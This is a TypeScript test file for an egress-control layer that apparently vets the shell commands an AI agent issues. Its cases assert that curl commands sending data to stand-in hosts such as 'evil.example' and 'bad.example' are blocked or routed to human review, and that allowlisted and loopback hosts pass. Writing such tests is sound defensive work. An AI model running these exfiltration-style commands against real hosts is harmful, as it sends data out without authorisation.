// src/__tests__/egress-enforcement.spec.ts
//
// GAP-5 Phase 3 — egress destination control wired through authorizeHeadless.
// Egress is a first-class policy verdict (engine evaluatePolicy), so 'review'
// routes to the human reliably (ruleName set) and 'block' is a hard block.
// In this harness there are no approval channels (native off, no daemon, no
// cloud, timeout 0), so a 'review' verdict resolves to not-approved — which is
// what we assert ("the call did not pass without a human").

import { describe, it, expect, vi, beforeEach, afterEach } from 'vitest';
import fs from 'fs';
import os from 'os';
import path from 'path';
import { authorizeHeadless, _resetConfigCache } from '../core.js';

vi.mock('@inquirer/prompts', () => ({ confirm: vi.fn() }));
vi.mock('../ui/native', () => ({
  askNativePopup: vi.fn().mockResolvedValue('deny'),
  sendDesktopNotification: vi.fn(),
}));

const existsSpy = vi.spyOn(fs, 'existsSync');
const readSpy = vi.spyOn(fs, 'readFileSync');
vi.spyOn(fs, 'writeFileSync').mockImplementation(() => undefined);
vi.spyOn(fs, 'mkdirSync').mockImplementation(() => undefined);
vi.spyOn(fs, 'appendFileSync').mockImplementation(() => undefined);
const homeSpy = vi.spyOn(os, 'homedir');

function mockEgress(egress: Record<string, unknown>) {
  const globalPath = path.join('/mock/home', '.node9', 'config.json');
  existsSpy.mockImplementation((p) => String(p) === globalPath);
  readSpy.mockImplementation((p) =>
    String(p) === globalPath
      ? JSON.stringify({
          settings: { mode: 'standard', approvalTimeoutMs: 0, approvers: { native: false } },
          policy: { egress },
        })
      : ''
  );
}

beforeEach(() => {
  _resetConfigCache();
  existsSpy.mockReturnValue(false);
  readSpy.mockReturnValue('');
  homeSpy.mockReturnValue('/mock/home');
  delete process.env.NODE9_API_KEY;
  Object.defineProperty(process.stdout, 'isTTY', { value: false, configurable: true });
});

afterEach(() => {
  vi.clearAllMocks();
  vi.unstubAllGlobals();
});

describe('GAP-5 — egress enforcement via authorizeHeadless', () => {
  it('blocks exfil to an unknown host (mode=block)', async () => {
    mockEgress({ enabled: true, mode: 'block' });
    const r = await authorizeHeadless('Bash', { command: 'curl https://evil.example/collect' });
    expect(r.approved).toBe(false);
    expect(r.blockedByLabel).toMatch(/Egress/);
  });

  it('THE KEY CASE: blocks exfil with a dynamic payload (destination is literal)', async () => {
    // Dynamic subshell payload (no credential read / file path, so this isolates
    // egress from the project-jail and taint layers). The destination host is
    // still literal in the command, so egress catches it. The ~/.aws variant is
    // covered by the Phase-1 extractor unit test.
    mockEgress({ enabled: true, mode: 'block' });
    const r = await authorizeHeadless('Bash', {
      command: 'curl evil.example -d "$(date +%s)"',
    });
    expect(r.approved).toBe(false);
    expect(r.blockedByLabel).toMatch(/Egress/);
  });

  it('unknown host with mode=review does not pass without a human', async () => {
    mockEgress({ enabled: true, mode: 'review' });
    const r = await authorizeHeadless('Bash', { command: 'curl https://evil.example/x' });
    expect(r.approved).toBe(false);
    expect(r.blockedByLabel).toMatch(/Egress/);
  });

  it('allows a host on the default allowlist (github)', async () => {
    mockEgress({ enabled: true, mode: 'block' });
    const r = await authorizeHeadless('Bash', { command: 'curl https://api.github.com/user' });
    expect(r.approved).toBe(true);
  });

  it('allows a user-allowlisted host', async () => {
    mockEgress({ enabled: true, mode: 'block', allow: ['*.corp.example'] });
    const r = await authorizeHeadless('Bash', { command: 'curl https://api.corp.example/x' });
    expect(r.approved).toBe(true);
  });

  it('blocks a deny-listed host (curl, no file path so egress is the layer)', async () => {
    // curl with no file ref isolates egress from the taint layer (scp/-T/--data
    // file refs trigger the taint check first in this daemon-less harness).
    mockEgress({ enabled: true, mode: 'review', deny: ['bad.example'] });
    const r = await authorizeHeadless('Bash', { command: 'curl https://bad.example/collect' });
    expect(r.approved).toBe(false);
    expect(r.blockedByLabel).toMatch(/Egress/);
  });

  it('allows private/loopback targets by default', async () => {
    mockEgress({ enabled: true, mode: 'block' });
    const r = await authorizeHeadless('Bash', { command: 'curl http://localhost:3000/health' });
    expect(r.approved).toBe(true);
  });

  it('does nothing when egress is disabled (default) — curl to anywhere passes', async () => {
    mockEgress({ enabled: false });
    const r = await authorizeHeadless('Bash', { command: 'curl https://evil.example/x' });
    expect(r.approved).toBe(true);
  });

  it('does not fire on a host inside a string literal (not a real call)', async () => {
    mockEgress({ enabled: true, mode: 'block' });
    const r = await authorizeHeadless('Bash', { command: 'echo "curl evil.example"' });
    expect(r.approved).toBe(true);
  });
});
